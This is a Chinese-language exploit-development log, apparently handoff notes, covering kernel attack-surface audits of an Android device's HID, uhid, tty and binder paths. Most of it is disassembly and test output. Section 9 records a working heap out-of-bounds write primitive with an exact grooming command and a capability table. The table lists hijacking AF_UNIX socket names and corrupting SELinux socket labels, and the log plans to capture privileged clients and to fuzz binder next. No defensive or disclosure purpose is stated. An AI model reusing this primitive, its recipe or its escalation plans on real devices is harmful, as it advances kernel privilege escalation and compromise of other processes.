# hid-multitouch 触摸路径审计 + 两条通道的封闭确认 (2026-09-21 23:0x)

## 0. 本轮目标与结论
目标: 当前原语"只能写零" ⇒ 去同驱动里找一条能写**非零**的路径(旧交接点名的
`mt_touch_report`/`mt_process_slot` = 假想 CVE-2026-64364 面)。
**结论: 这条路在本 vendor 构建里没有可控越界**(slot 索引双重检查、两处循环上界都是内核侧计数)。
同时确认另两条可能的数据通道都被关死(输入事件 / hidraw)。
⇒ "写非零"的狩猎必须离开 HID/MT 路径。

## 1. `mt_process_slot` @0xffffffc0101bd1cc —— slot 索引是**检查过**的
```
ldrsw x25, [x2, #0x28]         ; usage/flags
ldr   x24, [x1, #0x150]        ; x24 = input->mt   ← MT slot 数组(input_mt_slot, 每项 64B)
...
ldr   x8,  [x21, #0x50]        ; x8 = field->value  → w1 = 字段值(Contact ID, 设备可控!)
ldr   w1,  [x8]
...
sub   w3, w1, #0x1             ; w3 = value - 1
tbnz  w3, #0x1f, <skip>        ; ★ 负数检查
ldrb  w8, [x19, #0x69]         ; w8 = td->num_slots (字节, td+0x69)
cmp   w3, w8
b.ge  <skip>                   ; ★ 上界检查: value-1 >= num_slots ⇒ 直接跳过
add   x8, x24, x8, lsl #6      ; 之后才用 (value-1)*64 索引 input->mt
```
⇒ upstream 的 `if (slot >= td->num_slots) return;` 修复**在本机存在**。设备可控的 Contact ID
再怎么给都不会越界。另外 `input_mt_get_slot_by_key` 返回 -1 时也有 `tbnz #0x1f` 拦截 ✓。

## 2. `mt_touch_report` @0xffffffc0101bcedc —— 两处循环都由内核侧计数约束
```
; 循环 A: 遍历 report->field[] (由描述符在 probe 期建立, 内核侧)
101bd038  bl mt_process_slot
101bd03c  cbnz w0, <next field>          ; 按字段类型决定是否继续
101bd040  ldrb w8,[x20,#0x58]; add; strb ; td->+0x58 计数 +1 (仅计数, 不做索引)

; 循环 B:
101bd050  ldr w8, [x25, #0x830]          ; ★ 上界来自 td+0x830 (内核侧计数, 非设备数据)
101bd078  cmp w23, w8 ; b.hs <exit>
101bd080  add x9, x25, w23, sxtw #3
101bd084  ldr x24, [x9, #0x30]           ; td + 0x30 + i*8 ⇒ 与上界同源的指针数组 ✓
...
101bcf64  ldr w9, [x20, #0x6c]           ; td->num_expected (可由输入报告的 Contact Count 影响)
101bcf74  sub w19, w22, w9               ; ★ 只做减法(count - expected), 不用于索引
```
⇒ 设备可控的量(`Contact Count` → `num_expected`、各字段 value)只参与**减法/比较**,
不进入任何数组下标; 数组下标只来自内核侧计数(report->maxfield / td+0x830 / num_slots)。
⇒ **触摸路径在本构建里不是可控写原语。** 旧交接里把 CVE-2026-64364 定位到
`mt_touch_report`/`mt_process_slot` 的猜测, 应当降级为"已被本机代码否定"。

## 3. 两条可能通道的封闭确认
| 通道 | 状态 |
|---|---|
| **/dev/input/event\*** | 存在(event0..event6, 0660 root:input), 但 shell **全部打不开**(SELinux 拒; `dd` 全 rc=1) ⇒ 越界**读**的溢出字节无法通过 input 事件观察 ⇒ 不构成泄露原语 |
| **/dev/hidraw\*** | `CONFIG_HIDRAW=y` 但系统里**没有**节点(当前无 HID 设备) ⇒ 该接口不可用 |
| **我们自造设备是否产生 evdev 节点** | **会** —— 运行 groom7 期间 `/dev/input/event5`、`event6` 在 22:55 出现 ✓ 说明 uhid → input_dev 的链路是通的(只是读不到) |

## 4. ★★★★ 本轮真正的收获: `maxcontacts` 是**攻击者可控**的, 而且槽位数组是**早于它**分配的
这是"要一个能写非零的原语"最接近答案的一条, 全部结论都来自反汇编:

### 5.1 证据链
```
(A) mt_feature_mapping @0xffffffc0101bc578  (hid-core 在 hidinput_connect 里对 FEATURE 报告字段回调)
    101bc5d0  bl mt_get_feature            ; ① 请求 ContactMax 特性报告
    101bc5d8  ldrb w8, [x8]                ; ② w8 = field->value[0]  ← ★ 由 mt_get_feature 解析出的值
    101bc5dc  strb w8, [x21, #0x69]        ; ③ td->maxcontacts = w8
    101bc5e8  cmp  w8, #0xfa               ;    (夹取上限 250)
    101bc5f0  strb w8, [x21, #0x69]
    ⇒ mt_get_feature 的数据**完全由我们(uhid 用户态)提供** ⇒
      **td->maxcontacts 可由我们任意设定, 上限约 250**(单字节字段)

(B) mt_input_configured @0xffffffc0101bc2b0
    101bc32c  ldrb w8, [x27, #0x69]        ; 读 td->maxcontacts
    101bc330  cbz  w8, → strb w25(=10)     ; 为 0 时补默认 10
    ...
    101bc40c  ldrb w1, [x27, #0x69]        ; ★ w1 = 当时刻的 td->maxcontacts
    101bc418  bl input_mt_init_slots       ; input_mt_init_slots(input, 当时刻的 maxcontacts, ...)
    ⇒ **input->mt 槽位数组的容量 = 分配那一刻的 maxcontacts**(每槽 64 字节)

(C) mt_process_slot @0xffffffc0101bd1cc 的边界检查用的是**另一个**结构
    ldr x24, [x1, #0x150]                  ; x24 = input->mt        ← 数组(容量 = 分配时的 maxcontacts)
    sub w3,  w1, #0x1                      ; w3 = 设备给的 ContactID - 1
    ldrb w8, [x19, #0x69]                  ; w8 = td->maxcontacts   ← ★ 检查用的是"当前"值
    cmp  w3, w8 ; b.ge skip
    add  x8, x24, x8, lsl #6               ; 写入 input->mt + slot*64
    ⇒ **检查依据(td->maxcontacts) 与数组容量(input->mt 分配时的值) 是两个独立的量**

### 5.2 后果(若次序成立) = 值可控的堆越界写
如果 (B) 发生在 (A) 之前(即 `input_configured` 先跑、`feature_mapping` 后跑), 那么:
- `input->mt` 只按默认 10 槽分配(640 字节)
- 之后我们把 `td->maxcontacts` 设成 250
- 再发一条 `UHID_INPUT2` 输入报告, 其中 ContactID = 200 ⇒ 检查 `199 >= 250` 为假 ⇒ 放行
- ⇒ **向 `input->mt + 199*64` 写入, 越界约 12 KB**, 而且写入的**内容**来自我们报告里的
  TipSwitch/ContactID/X/Y 字段 ⇒ **非零、完全可控** ⇒ 这正是"零写"短板的解药 ✓✓✓

### 5.3 次序问题的现状(唯一未定项)
- `hidinput_connect`@0xffffffc010ea416c 的完整函数体里只有两个间接驱动回调调用点:
  `blr x22`(10ea4270, 早, 由 `ldr x22,[x8,#0x88]` 供) 与 `blr x23`(10ea48a4, 由 `ldr x23,[x8,#0x80]` 供),
  且都在 `bl input_register_device`(10ea4930) **之前** ✓
- `input_mt_init_slots` 按上游要求必须早于 `input_register_device` ⇒ 两者都在注册前 ⇒ 只能靠偏移区分
- 但**整个 hidinput_connect 里没有出现对 `[hdrv+0x78]` 的加载** ⇒ 说明我此前依据的
  "偏移↔回调名" 映射(旧交接的 +0x68..+0x80 那张表)不可靠 ⇒ **必须把真实偏移钉死**
- 钉死方法(已试过一半): 从 `.rela.dyn` 找 addend == mt_* 函数地址的条目, 其 r_offset − `mt_driver`
  基址就是字段偏移。本轮发现两件事: `.rela.dyn` 里 **1027 个条目全是 R_AARCH64_RELATIVE**,
  但**没有任何 addend 落在 0x101b0000-0x101c0000(hid-multitouch 代码区)**, 且 `mt_driver`
  在镜像里对应区域**全 0** ⇒ 该段的指针重定位编码/段映射与我的假设不同(需先修好这个解码)
- 另一条更省事的路: **直接实测** —— 造一个规范 MT 触摸描述符(ContactMax 特性 + ContactID/TipSwitch/X/Y
  的输入报告), 对 ContactMax 的 GET_REPORT **回正确 ID 且值给 200**, 然后发 ContactID=200 的
  `UHID_INPUT2`; 有越界就会崩/破坏堆, 对照组(值给 10)不应有事

## 5. 对"写非零"狩猎的修正(在原结论上新增第 4 节的例外)
- HID/MT 的**触摸/事件**路径: 已用**反汇编级**证据排除(slot 检查在、循环上界内核侧) ⇒ 不再投入
- kmalloc-128 可达对象里"清 0 即放宽"的候选已逐个排除:
  `unix_address`(refcnt→0 只造成 WARN/泄漏; len→0 使名字变空闲——这是**唯一**有实际意义的效果, 即名字抢占)、
  `sk_security_struct`(sid→0 = 非法 SID ⇒ EINVAL 全拒)、`hid_field`(头部指针被清零 ⇒ 崩, 属于"敌人")、
  `pid.count`→0(仅 WARN)、`task_delay_info.flags`→0(少记账)、`user_key_payload.datalen`→0(读返回 0)
- ⇒ 剩下真正有希望的两条:
  1. **名字抢占升级**: 现在只能抢到我们自己 socket 的名字。若能打中**系统进程**的抽象名 socket 的
     `unix_address`, 其名字就变空闲 ⇒ 我们 bind 同名 ⇒ 特权客户端连上来 = 落到我们手里。
     关键已知条件: AF_UNIX 的 `connect` 在 SELinux 里**不检查**(`selinux_socket_connect` 对非 INET 家族提前 return 0),
     所以客户端那侧的"连到谁"没有 MAC 门槛; 障碍在后续 sendmsg 的 peer_sid 判定。
  2. **把零写当"使能"而非"改值"**: 例如让某个对象的 refcount 归零从而阻止它被释放(泄漏),
     再配合别的原语回收利用; 或清掉某个"已校验"标记让同一数据被二次消费。


---
# 6. ★ 收尾: maxcontacts 线索**判死** (用回调参数签名定的次序)
上一节(§4)的推断需要"input_configured 早于 feature_mapping"。本轮用反汇编把次序钉死, 结论是**反过来**:

### 6.1 hidinput_connect 里两个间接回调的身份(靠参数签名, 不靠旧表格)
| 调用点 | 参数设置 | 身份 | 地址 |
|---|---|---|---|
| `[hdrv+0x88]` | `x0=x19(hdev), x1=[x27], x2=x21(usage)` = **3 个**; 外层遍历 feature 报告的 usage 表(`report_id_hash`, 经 `hdev+0x30`/`+0x830`) | **`feature_mapping`** | 0x10ea4270 |
| `[hdrv+0x80]` | `x0=x19(hdev), x1=x22` = **2 个**; 外层是 `list_for_each_entry(hid_input, &hid->inputs, list)`(`ldr x25,[x22]` 取 next), 且**检查返回值** `cbnz w0` | **`input_configured`** | 0x10ea48a4 |
- 另有全内核 `bl` 扫描(解 bl 编码逐条比对目标地址): **两个回调都没有任何直接调用点** ⇒ 只可能走驱动回调表 ✓
- ⇒ 执行次序: **feature_mapping(0x4270) → input_configured(0x48a4)** ⇒
  `input_mt_init_slots(input, td->maxcontacts)` 拿到的**已经是我们伪造后的 maxcontacts** ⇒
  **槽位数组容量与 mt_process_slot 的边界检查一致 ⇒ 没有越界** ✗
- **结论: §4 那条"值可控越界写"不成立, 本节把它关闭。** 价值在于: 下轮不要再投入这条线。

### 6.2 mt_feature_mapping 三个分支全带边界检查(顺带拿到 hid_field 局部布局)
```
101bc58c  ldr w8,[x2]              ; usage->hid
  == 0x000D0055 (ContactMax) → 101bc5cc:
      bl mt_get_feature
      ldr x8,[x19,#0x30] → ldrb w8,[x8]   ; field->value[0]  ← ★ 我们的伪造值
      strb w8,[x21,#0x69]                 ; td->maxcontacts = value
      cbnz w8, …                          ; 为 0 时用 field->logical_maximum([x19+0x3c]),
      ldr w8,[x19,#0x3c] ; cmp w8,#0xfa   ;   且夹到 <=250
      strb w8,[x21,#0x69]
  == 0xFF0000C5 (vendor) → 101bc604: if ([x20+8]!=0) return; bl mt_get_feature; 落到下面的公共尾部
  == 0x000D0059 → 101bc618:            ; 公共尾部
      ldr w8,[x20,#8] ; ldr w9,[x19,#0x28] ; cmp w8,w9
      b.hs <_dev_err; return>          ; ★★ 索引前有上界检查(旧交接怀疑的修复, 确认存在)
      bl mt_get_feature
      ldr x8,[x19,#0x30] ; ldr w8,[x8,x9,lsl#2]   ; field->value[idx]
      strb w8,[x21,#0x6a]
```
⇒ 得到 `struct hid_field` 局部布局(本机): `value @0x30`, `logical_maximum @0x3c`, `report @0x50`,
`0x28` = 上界(参与 `idx >= X` 检查), `0x30/0x3c` 之外还有 `0x18/0x69/0x6a`(td 侧)。

### 6.3 修正后的下一步
1. **转向 HID 描述符解析路径**: `rd_data` 有 **4096 字节 且内容 100% 由我们给** ⇒
   `hid_open_report` → `hid_parse_report`/`hid_add_field`/`hid_register_field` 是**完全攻击者可控**
   的解析器(Report Count/Size、logical min/max、usage 数、report_offset 累加)。
   历史上有大量"描述符驱动"的越界/整数溢出 CVE, 而 vendor SPL 2024-02 说明之后的上游修复都缺。
   我们现在的描述符已经把 Report Count 用到 1023 了, 但还没试过极端组合(65535、size=32、
   usage 表巨大、以及各字段累加溢出的组合)。
2. 名字抢占 / 零写当"使能"用(见 §5)。
3. 降崩溃率(见 §5)。


---
# 7. 第七轮: HID 描述符解析路径审计 + 极端描述符实测(无收获, 但拿到一条边界)
审计对象: `hid_open_report` → `hid_parse_report`@0xffffffc010e9f3fc → `hid_add_field`@0xffffffc010ea2c90
(rd_data 4096 字节内容 100% 由我们给 ⇒ 解析器完全攻击者可控)

### 7.1 静态: hid_add_field 里已有的防护(反汇编)
```
10ea2d14  ldr w27,[x19,#0x1c]  ; global.report_id
10ea2d18  cmp w27,#0xff ; b.hi → 报错          ; ★ report_id <= 255 检查
10ea2dd4  ldr w23,[x22,#0x834] ; report->size(位, 累加)
10ea2de8  madd w9,w9,w8,w23 ; str w9,[x22,#0x834] ; report->size += size*count
10ea2e04  cmp w9,w10 ; b.hi → 报错             ; ★ 累加后有上限检查
10ea2e18  ldr w10,[x22,#0x830] ; report->maxfield
10ea2e24  cmp w10,#0x100 ; → 报错              ; ★ maxfield < HID_MAX_FIELDS(256)
10ea2e30  umull x8,w24,w8      ; 64 位乘: 24 * report_count   ← 无 32 位溢出
10ea2e34  add x0,x8,#0x70 ; bl kzalloc          ; 字段+usage 一次分配, 大小按 report_count
10ea2f20/2f54/2f58 循环 i < report_count, 写 field->usage[i] (步长 0x18)
```
⇒ 可疑点只有一个: usage 的**读**循环上界是描述符给的 `report_count`(最大 65535),
而源数组 `parser->local.usage[]` 只有 **HID_MAX_USAGES = 12288** 项 ⇒ 理论上越界**读**(最多
(65535-12288)*4 ≈ 213 KB), 把相邻内存当 usage 用。写侧有界(目标数组按 report_count 分配) ✓

### 7.2 实测: 三种极端 Report Count 全部通过, 无崩溃
```
工具 C://qemu_test//uhid_dfuzz.c (描述符程序化构造: FEATURE ID1 ContactMax 用极端 Report Count
     + 一个普通 INPUT ID3 让 hid-multitouch 能绑定)
### 基线 1023 ###   write ret=4376  400ms 后仍存活
### 20000  ###     write ret=4376  400ms 后仍存活
### 65535  ###     write ret=4376  400ms 后仍存活
```
⇒ 解析路径对极端 Report Count 有容忍(要么存在 report_count↔usage 数的检查, 要么越界读落在
映射内存里没触发任何可见后果) ⇒ **本轮没有找到可直接利用的解析路径 bug**。
需要更强的手段才能继续(例如把 fd/内存布局做成可观测的差异, 或去审 `hid_parse_report` 的
fetch_item/collection_stack 分支 —— 本轮没审完)。

### 7.3 ★ 顺带确认的一条重要参数边界(影响我们自己的原语)
`uhid_hid_get_raw` 有 `if (count > UHID_DATA_MAX(4096)) return -EINVAL;` ⇒
**mt_get_feature 要请求的 ID1 报告长度 `hid_report_len(ID1) = n1+1` 必须 ≤ 4096**, 即 **n1 ≤ 4095**。
⇒ 漏洞缓冲最大只能到 `kmalloc(n1+8) = kmalloc-8k`; 而 memset 长度 `min(rsize,8192)` ⇒
越界字节 = rsize+1-O 在 O=8192 时最多 1 字节 ⇒ **实际可用的 cache 范围是 kmalloc-128 ~ kmalloc-2048**
(其中 kmalloc-2048 + rcnt 大 ⇒ 越界可达 ~6 KB, 是把原语升级成"大范围零写"的参数空间)。


---
# 8. 第八轮: 靶子来源盘点 + uhid 回复长度溢出线索(判死) + 一条独立确认
### 8.1 ★ 靶子来源盘点: 只有 AF_UNIX 抽象名这一个可读靶子
```
工具 C://qemu_test//tgt_probe.c 实测:
  1) SYSV 消息队列:  msgget → ENOSYS("Function not implemented")  ⇒ **SYSVIPC 根本没编进内核**
     ⇒ msg_msg(48+payload, 任意大小可 msgrcv 回读)这条路直接断
  2) keyring:        add_key(80..2560) → **EACCES**(SELinux 拒绝)  ⇒ user_key_payload 也不可用
```
⇒ **shell 能拿到的"可读 kmalloc 靶子"仍然只有 AF_UNIX 抽象名(≤118 字节 ⇒ 只能落在 kmalloc-128)**。
⇒ 结合第七轮那条边界(n1 ≤ 4095 ⇒ 缓冲可到 kmalloc-2048): 原语**能写到的 cache 范围**是
kmalloc-128~2048, 但**有靶子的 cache 只有 kmalloc-128** ⇒ **实际有效范围 = kmalloc-128**
(外加 SELinux sk_security_struct, 用 sendto 的 EINVAL 观测)。这是靶子清单的最终结论。

### 8.2 uhid 回复长度溢出: 实测 + 反汇编双重判死
假设: `report_buf = kzalloc(rd_size)` 而 `UHID_GET_REPORT_REPLY.size` 上限 4096 ⇒ 内容可控堆溢出。
```
工具 C://qemu_test//uhid_rbl.c (rd_size=53 的描述符, 只回一条 GET_REPORT_REPLY):
  size=2     write ret=4376 成功, 300ms 后存活
  size=64    write ret=4376 成功, 存活     (已超出 53)
  size=200   write ret=4376 成功, 存活     (已越过 kmalloc-128 槽)
  size=2048  write ret=4376 成功, 存活
  size=4096  write ret=4376 成功, 存活     (设备 uptime 34 分钟, 全程未重启)
```
反汇编定性(`uhid_char_write`@0xffffffc010eb111c):
```
10eb1328  ldrh w8,[x19,#0x1054]   ; 取回复的 u16 size
10eb134c  cmp  w8,#0x1,lsl#12     ; ★ 与 4096(UHID_DATA_MAX) 比较
10eb1350  mov  w9,#0x1000         ; ★ 夹到 4096
10eb1394  bl   memcpy
```
并且 `uhid_dev_create2`@0x10eb1a50(只有 `cmp w8,#0xfff` 的 rd_size 校验 + `kmemdup(rd_data)`)与
`uhid_char_open`@0x10eb155c(只有一次大块 `kmalloc_order` = uhid_device 本身)里**都没有按 rd_size
分配 report_buf** ⇒ 回复数据的落点是**固定的 4096 字节区域**, `cmp #0x1000` 的夹取正好对应它
⇒ **不存在溢出** ✓ 线索关闭(这也解释了实测为何全部成功且不崩)。

### 8.3 ★ 独立确认: HID probe 确实是异步的
`uhid_dev_create2` 里出现 **`bl queue_work_on`**(0x10eb1b80)⇒ `hid_add_device` 走工作队列,
`mt_feature_mapping → mt_get_feature` 因此跑在 kworker 上 —— 这与第一轮 `uhid_t1` 的
"write 3ms 返回、GET_REPORT 1.6ms 后才到"完全一致, 也是整个堆风水设计(2 秒窗口)的根据 ✓

### 8.4 战略处境(交给下一轮判断)
可达面里已审过: hid-multitouch 的 feature/触摸/事件面(全有边界检查)、HID 描述符解析
(hid_add_field 有防护; 极端 Report Count 实测无后果)、uhid 的回复长度(固定 4096, 无溢出)、
uinput/FF(需要 evdev 才能发起 FF 上传 ⇒ 不可达)、SYSVIPC/keyring(不可用)。
⇒ 剩下的选择: ①回头把 `hid_parse_report` 的 fetch_item/collection_stack 分支审完(唯一没审完的 HID 面);
②换一个 shell 可达的子系统重新找洞; ③把现有零写原语当"可复现的越界写 + SELinux 状态可达"成果收口,
并提高其可靠性(降崩溃率)用于 DoS/降级类目标。


---
# 9. ★★ 第九轮: 生产配方(burst2=192 + delay=60ms) —— 连续两轮不崩, 影响面 ~75%/发
### 9.1 配方与实测
```
./uhid_groom7 4 24 40 192 60 136 1 100 4000 0 1
  = pin cpu4 + prefill 4000 socket(=~8000 个 kmalloc-128 对象) + burst1 40 + burst2 192
    + delay 60ms + rcnt 136(越界 9 字节) + 靶子 namelen=100 + 边回读边扫
```
| 轮次 | addr 丢失(逐 socket 定位) | SELinux blob 命中 | 合计 | 是否崩 |
|---|---|---|---|---|
| A | **6** (4970 5205 7844 8682 8917 9381) | **11** | 17 / 24 发 | **否**（跑完 24 发 + 全量扫描） |
| B | **7** (4514 5210 5905 6814 7754 8220 8670) | **11** | 18 / 24 发 | **否** |
| 旧配方(burst2=128, delay=20) | 4~9 | 1~4 | — | 约一半的运行会崩 |
- 关键改动: **burst2 从 128 提到 192**(把 buffer 所在页及其后一页都铺满我们的对象),
  窗口从 20ms 放宽到 60ms ⇒ 邻居是"别人的活对象"(probe 自己的 hid_field)的概率显著下降
- addr 命中的索引仍由两个独立 oracle 交叉验证(/proc 缺失 + bind 同名成功)完全一致 ✓
- 两轮都是 addr:SELinux ≈ 1:1.6~1.8(每个 socket 的 2 个 kmalloc-128 对象里, sksec 更容易被命中)

### 9.2 目前原语的能力总表(收口)
| 能力 | 证据 | 可复现命令 |
|---|---|---|
| 受控越界写(9 字节起, 到 kmalloc-2048 可放大约 6KB) | 对照 0 / 实验 N | `uhid_groom7 4 24 40 192 60 136 {0,1} 100 4000 0 1` |
| 命中 kmalloc-128 相邻对象, 影响 ~75%/发 | 两轮 17/18 个对象 | 同上 |
| 逐 socket 精确定位受害者 | /proc 缺失索引 == bind 抢占成功索引 | 输出里的 `缺失索引=` |
| 破坏 `unix_address`(len/refcnt/hash)→ **名字抢占** | 被清 len 的名字可被我们 bind 成功 | `[take ]` 行 |
| 破坏 SELinux `sk_security_struct`(sid)→ 该 socket 判定变 EINVAL | 全扫 sendto: 异常 EINVAL=11 | `[scan ]` 行 |
| 全流程不崩(生产配方) | 连续两轮 24 发 | uptime 不复位 |
### 9.3 仍受的限制
- 有效 cache 只有 kmalloc-128(可读靶子只有 AF_UNIX 名; SYSVIPC/keyring 不可用) ⇒ 见 §8.1
- 内容只能写 0(memset) ⇒ 只能清字段, 不能放行 SELinux(需要 sid=1) ⇒ 见第三轮/§6
- 受害者基本都是**我们自己的**对象(因为我们必须占满页) ⇒ 名字抢占目前只能抢自己的名字
- ~~退出时被清 refcnt 的 socket 会触发 refcount WARN ⇒ panic_on_warn ⇒ 重启~~
  ★ **已实测推翻**: 20 发跑完并**正常退出**(exit=0)后 12 秒, 设备 uptime 仍从 41→42 分钟 ⇒ **没有重启**;
  又用 hold=1 挂住进程 30 秒(uptime 40→41)同样不重启, 之后 pkill 结束它也不重启
  ⇒ **本机 panic_on_warn 未生效(或被清 refcnt 的 close 路径不产生致命 WARN)**
  ⇒ **不需要 hold=1, 原语可以反复运行、设备不重启**; 此前遇到的几次重启都发生在**开火期间**,
  根因是「邻居是别人的活对象」(probe 自己分配的 hid_field) —— 生产配方已把这种情况大幅压下去
  (旁注: 既然如此, 之前「getsockname 会因 refcount_inc(0) 触发 panic」的说法也可能被高估了,
   但没有实测, 仍按危险处理)


---
# 10. 第十轮: ptmx/tty 面侦察(阴性) + 一个方法论纠正
### 10.1 /dev/ptmx 能力侦察(新工具 `C://qemu_test//tty_probe.c`)
```
可开 /dev/ptmx ✓   TIOCGPTN ✓   TIOCSPTLCK(解锁) ✓   TIOCGPTPEER ✓(直接拿到 slave fd, 不需 /dev/pts/N)
TIOCSETD → N_TTY(0) ok; 其余全部失败:
   1 N_SLIP / 3 N_PPP / 13 N_HDLC / 15 N_TRACE / 17 N_SLCAN / 18 N_NULL / 21 N_GSM0710
   / 22 N_CAIF / 23 N_6PACK / 99 → **EINVAL(22)**   ⇒ 这些 ldisc 根本拿不到(tty_ldisc_get 失败)
   2 N_MOUSE → **EPERM(1)**                        ⇒ 有权限门
TIOCSTI(注入按键) → master **EPERM**, slave **EACCES**  ⇒ 经典"注入特权 tty"路线关闭
TIOCSCTTY → EPERM   TIOCSWINSZ → ok
```
⇒ **ldisc 切换这条经典 LPE 路(n_hdlc/ppp/slcan 类 UAF)在本机不可达** ✓
可达的只剩"pty 创建/销毁 + termios + winsize"这些基础操作(要审 pty 生命周期 bug 才是另一大工程)。

### 10.2 ★ 方法论纠正: `write()` 成功 ≠ 描述符被接受
`write(fd, CREATE2)` **只把事件入队**; probe 在 `uhid_device_add_worker`(workqueue)里异步执行,
`hid_parse_report` 失败只会 `dev_err` 并放弃设备, **不会**让 write 返回错误(实测任何描述符都是
`write ret=4376`) ⇒ **§7.2 那些"极端 Report Count 都被接受"的结论被削弱了**: 它们只能证明
"没崩", 不能证明"描述符通过了解析"。
**结论性做法**(下一轮请用): 创建后**等 GET_REPORT 是否到达**(到达 ⇒ 设备真的绑定成功 ⇒ 描述符被接受),
或读 `/proc/bus/input/devices` 看设备是否出现。`uhid_dfuzz` 目前只做前者的一半(不等事件), 需要补。
另外 host 侧 adb 调用近期频繁被 SIGTERM 掐断(输出为空), **不能用"输出为空"判定内核崩溃**,
必须单独查 `uptime` 是否复位。

### 10.3 本轮新增/修正清单
- 新工具: `C://qemu_test//tty_probe.c`(ptmx/ldisc 侦察)
- 修正: 退出不重启(§9.3)、`write()` 成功≠接受(本节)、dfuzz 结论需打折(§7.2)
- HID 面现状: 解析路径(hid_add_field 有防护) / feature 面 / 触摸面 / 事件面 / uhid 回复长度
  —— 都已审, 未发现可用点; **唯一残留的不确定处**: 极端描述符在"是否真的通过解析"这一点上没有实测
  (需要 §10.2 的结论性做法)。


---
# 11. ★★ 定性收尾: 描述符极端输入一律被"拒绝"而非越界 (第十一轮)
### 11.1 正确的接受判据
上一节 §10.2 指出"write 成功≠被接受"。本轮把判据换成 **`UHID_START`(type=2) 事件**:
它由 `hid_hw_start → hid_connect` 之后发出, 而这条路径**要求描述符已经解析成功** ⇒ 收到 START
就证明"解析通过、设备真的起来并绑定了" ✓ (这个判据可复用于任何描述符实验)
(试过的错误判据: 在 /proc/bus/input/devices 里搜我们的设备名 —— **假阴性**, 因为 input 设备名会被
 hid-multitouch 的 `mt_input_configured` 用 devm_kasprintf 覆盖掉)

### 11.2 实测(工具 `uhid_dfuzz`, 判据 = 2 秒内是否收到 START)
| 变体 | START | OPEN | GET_REPORT | 判定 |
|---|---|---|---|---|
| Report Count = 1 (基线) | ✓ | – | ✓ | **通过解析**、设备绑定 |
| Report Count = 1023 (groom 一直用的) | ✓ | – | ✓ | **通过解析** |
| Report Count = 20000 (> HID_MAX_USAGES=12288) | ✗ | ✗ | ✗ | **被内核拒绝** |
| Report Count = 65535 | ✗ | ✗ | ✗ | **被内核拒绝** |
| nest = 400 (嵌套 Collection > 256) | ✗ | ✗ | ✗ | **被内核拒绝** |
设备 uptime 全程连续(58 分钟) ⇒ 没有任何一次崩溃 ✓

### 11.3 定性结论
- **`report_count > HID_MAX_USAGES(12288)` 的字段会被 `hid_add_field` 拒绝** ⇒ §7.1 里
  "usage 读循环上界是 report_count, 可能越界读 12288 之外"这条**在真实路径上不可达**
  (该描述符通不过解析) ⇒ 最后那个例外点关闭 ✓
- **嵌套 Collection 超过 256 层也被拒绝** ⇒ collection stack 有上限检查 ✓
- ⇒ **HID 描述符解析面(含 hid_add_field / hid_parse_report 的 item 处理)** 到此可定性为
  **无可用点**: 解析器对极端输入的行为是"干净拒绝", 不是越界写/读
- 至此 HID 全链路(feature 面 / 触摸面 / 事件面 / 解析面 / uhid 回复长度)都已定性关闭

### 11.4 复用手法小结(值得保留)
1. 判"描述符是否被接受" = 等 `UHID_START`(type=2), **不要**看 write() 返回值, 也不要在
   /proc/bus/input/devices 里搜设备名
2. 判"内核是否崩" = 单独查 `uptime` 是否复位; **不要**用"输出为空"当证据(host 侧 adb 常被掐断)
3. 找"谁调用了某函数" = 全内核扫 `bl` 编码解出目标地址(见 §6/§10 用的方法)
4. 读 .rela.dyn 解指针、用完整 VMA 反汇编、CFI 桩单条 b —— 见交接文档


---
# 12. ★★ 新面侦察: binder (可达!) + 第一轮事务解析面测试(校验有效)
### 12.1 可达性 (工具 `C://qemu_test//binder_probe.c`)
```
open /dev/binder ✓   mmap(1MB, PROT_READ) ✓   BINDER_VERSION → protocol=8 ✓
BINDER_SET_MAX_THREADS ✓   BINDER_SET_CONTEXT_MGR → EBUSY(已被 servicemanager 占, 符合预期)
BINDER_WRITE_READ(BC_TRANSACTION → handle 0 = servicemanager) → 0, write 消耗 68/68
```
⇒ **SELinux 允许 shell 域向 servicemanager 发 binder 事务** ⇒ 内核的事务解析路径
(目标查找 → 按**我们给的** `data_size`/`offsets_size`/`offsets[]` 逐个 translate → 分配目标缓冲 → 入队)
**可以用完全可控的参数走到** ⇒ 这是项目从未碰过的一个"可达 + 富接口"面(binder 历史上的 bug 密集区)。

### 12.2 ★ 方法论坑(与 uhid 那次同构, 值得单独记)
- **`TF_ONE_WAY` 事务没有回执**: 内核丢弃错误, ioctl 仍然返回 0 ⇒ "成功"毫无意义。
  必须用**同步事务(flags=0)**, 并**解码 ioctl 读回的命令码**(BR_* 事件)才能定性。
- 读回的命令码对照(binder UAPI 的 `_IO('r', N)`):
  `0x0000720c = BR_NOOP`, `0x00007211 = BR_FAILED_REPLY`, `0x00007206 = BR_TRANSACTION_COMPLETE`,
  `0x40407203 = BR_REPLY`, `0x00007265?? = BR_DEAD_REPLY`
- ⚠ 解码必须在**第一次 ioctl 之后立刻**做: 后续读循环会覆盖 `read_consumed`(我第一次就踩了)

### 12.3 第一轮测试结果(判据 = 首次回执命令码)
| 变体 | 首次回执 | 判定 |
|---|---|---|
| A 良性形状: data=64, offsets_size=8, offsets[0]=0 | BR_NOOP + **BR_FAILED_REPLY** | 被拒* |
| B offsets[0]=0x1000 (越界偏移) | BR_NOOP + **BR_FAILED_REPLY** | 被拒 |
| C offsets_size=7 (非 8 对齐) | BR_NOOP + **BR_FAILED_REPLY** | 被拒 |
| D data_size=0x7fffffff | BR_NOOP + **BR_FAILED_REPLY** | 被拒 |
- *A 之所以也被拒, 是因为我们 data 里填的是 0x41 而不是合法的 binder 对象
  (`binder_translate_*` 遇到非法对象类型就 `err_bad_object_type` 拒绝) —— 这是**预期行为** ✓
- 四次测试 **uptime 全程连续, 一次都没崩** ⇒ 该路径的参数校验在 5.4.281 上有效 ✓
  (即经典的"offsets/偏移越界"类 bug 在这台机器上已被修掉)

### 12.4 下一轮可以怎么继续(binder 面才刚开头)
1. **构造合法的 binder 对象**把事务推进到更深处:
   `struct flat_binder_object { __u32 type; __u32 flags; union { binder_uintptr_t binder; __u32 handle; }; binder_uintptr_t cookie; }`
   —— 用 `BINDER_TYPE_FD`(0x02) 且 handle=真实 fd, 就能走到 `binder_translate_fd`(fget/文件引用计数那条路);
   用 `BINDER_TYPE_BINDER`/`HANDLE` 可走到 `binder_translate_ptr`/节点引用那条路。
2. 用 servicemanager 的 **Parcel 协议**发合法请求(如 `getService(name)`) ⇒ 走到目标进程的 parcel 解析与回复路径。
3. 把 `binder_probe` 扩成对 (type, flags, handle/fd, cookie, offsets[]) 的组合 fuzz,
   判据用本次定下的 BR_* 回执法(比"看 ioctl 返回值"可靠得多)。


---
